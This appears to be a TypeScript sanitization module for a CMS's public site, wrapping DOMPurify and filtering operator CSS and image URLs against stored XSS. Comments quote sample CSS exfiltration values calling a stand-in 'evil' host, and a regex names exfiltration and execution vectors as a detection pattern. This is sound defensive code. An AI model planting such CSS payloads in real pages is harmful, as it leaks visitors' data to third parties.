/**
 * HTML sanitization for user-authored content rendered with `{@html}` on the
 * PUBLIC client surface (page-builder CMS pages, section blocks).
 *
 * Page-builder blocks store HTML authored through the Studio editor. The public
 * host renders that HTML verbatim with `{@html}`, so without sanitization a
 * stored `<script>` (planted by any editor with page-write access, or through a
 * future lower-privilege role) becomes stored XSS running in every visitor's
 * browser. We wrap DOMPurify with a single `safeHtml()` so call sites don't have
 * to know which config to pass. Mirrors packages/studio/src/lib/sanitize.ts.
 *
 * The client ships as a static SPA (`ssr = false` everywhere), so `window` is
 * always defined when this runs; the SSR fallback below is defence-in-depth in
 * case that ever changes.
 */

import DOMPurify from 'dompurify';

// DOMPurify keeps `style` values that use safe URL schemes, so `style="background:
// url(https://evil/track)"` would still exfiltrate a visitor's IP. The engine's
// server-side sanitizer validates each CSS property; here we match its intent by
// dropping any style value carrying an exfil/execution vector. Registered once
// (hooks are global to the DOMPurify instance) and only in a DOM context.
const DANGEROUS_STYLE = /url\(|expression\(|@import|javascript:|\/\*/i;
let _styleHookAdded = false;
function ensureStyleHook(): void {
  if (_styleHookAdded || typeof window === 'undefined') return;
  _styleHookAdded = true;
  DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
    if (data.attrName === 'style' && DANGEROUS_STYLE.test(data.attrValue)) {
      data.keepAttr = false;
    }
  });
}

const ALLOWED_TAGS = [
  'a',
  'b',
  'i',
  'em',
  'strong',
  'u',
  's',
  'br',
  'p',
  'span',
  'div',
  'ul',
  'ol',
  'li',
  'blockquote',
  'code',
  'pre',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'img',
  'figure',
  'figcaption',
  'table',
  'thead',
  'tbody',
  'tr',
  'th',
  'td',
  'hr',
];

const ALLOWED_ATTRS = [
  'href',
  'src',
  'alt',
  'title',
  'target',
  'rel',
  'class',
  'style',
  'colspan',
  'rowspan',
];

/**
 * Sanitize untrusted HTML before handing it to `{@html ...}`.
 *
 * DOMPurify blocks script/iframe/object/embed and event-handler attributes
 * (on*), and rewrites unsafe href/src protocols. The explicit allow-lists are
 * belt-and-braces in case the upstream defaults loosen.
 */
export function safeHtml(html: unknown): string {
  if (typeof html !== 'string' || html.length === 0) return '';
  if (typeof window === 'undefined') {
    // SSR fallback (should never run — the client is a static SPA): strip all
    // tags rather than ship raw HTML into the response stream.
    return html.replace(/<[^>]*>/g, '');
  }
  ensureStyleHook();
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR: ALLOWED_ATTRS,
    ADD_ATTR: ['rel'],
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
  });
}

/**
 * Make operator-supplied CSS safe to place inside a `<style>` block.
 *
 * The zone theme carries `custom_css`, and the root layout wrote it into
 * `<style>{theme.custom_css}</style>`. Svelte escapes for HTML, not for CSS,
 * and inside a `<style>` element the browser is parsing CSS — so `</style>` in
 * the value closes the block and everything after it is markup again. That is
 * a script tag away from executing on every page of the public site, written by
 * whoever can edit a zone theme.
 *
 * Even without the escape, CSS on its own reaches the network: `url(...)` and
 * `@import` fetch, which turns a stylesheet into a visitor tracker and, with
 * `background-image: url(https://evil/?t=…)`, a way to read values out of the
 * page.
 *
 * This is a filter, not a parser. It removes the constructs that leave the
 * stylesheet — the same list `DANGEROUS_STYLE` uses for inline `style`
 * attributes — and neutralises anything that could terminate the element. A
 * theme that needs a web font should get an explicit field for it rather than
 * a hole here.
 */
export function safeCss(css: unknown): string {
  if (typeof css !== 'string' || css.length === 0) return '';
  // 64 KB is far beyond any legitimate theme override and bounds the work.
  if (css.length > 64_000) return '';
  return (
    css
      // Anything that could close the <style> element, in any casing, and the
      // HTML comment delimiters that let a payload hide from the CSS parser.
      .replace(/<\s*\/?\s*(style|script)\b[^>]*>/gi, '')
      .replace(/<!--|-->/g, '')
      // Network fetches: url(), @import, and the legacy IE expression().
      //
      // Renamed to an unknown function rather than wrapped in a CSS comment:
      // a comment ends at the first `*/`, so an input already containing one
      // would close it early and hand the rest back to the parser as live CSS.
      // `zvx(` is not a function any engine knows, so the whole declaration is
      // dropped — and nothing that looks like `url(` survives in the output to
      // confuse the next reader.
      .replace(/@import\b[^;]*;?/gi, '')
      .replace(/\burl\s*\(/gi, 'zvx(')
      .replace(/\bexpression\s*\(/gi, 'zvx(')
      // Scheme-bearing values that survive the above.
      .replace(/javascript\s*:/gi, '')
      .replace(/\bbehavior\s*:/gi, '')
  );
}

/**
 * Restrict a theme-supplied URL to schemes that only ever fetch an image.
 *
 * `favicon_url` and `logo_url` are written straight into `href`/`src`. Svelte
 * escapes the value, so this is not an injection — but `javascript:` in an
 * `href` is not injection either, it is simply a URL the browser will execute
 * when someone clicks. `data:` is the other one: `data:text/html,…` in a link
 * navigates to attacker-authored markup on a same-origin-looking page.
 *
 * Relative paths and https are what a real theme uses. Everything else returns
 * empty, so the element renders without an image instead of with a payload.
 */
export function safeImageUrl(url: unknown): string {
  if (typeof url !== 'string') return '';
  const t = url.trim();
  if (t.length === 0 || t.length > 2000) return '';
  // Relative paths, including protocol-relative //host which is https in
  // practice and cannot carry a scheme.
  if (t.startsWith('/')) return t;
  return /^https?:\/\//i.test(t) ? t : '';
}
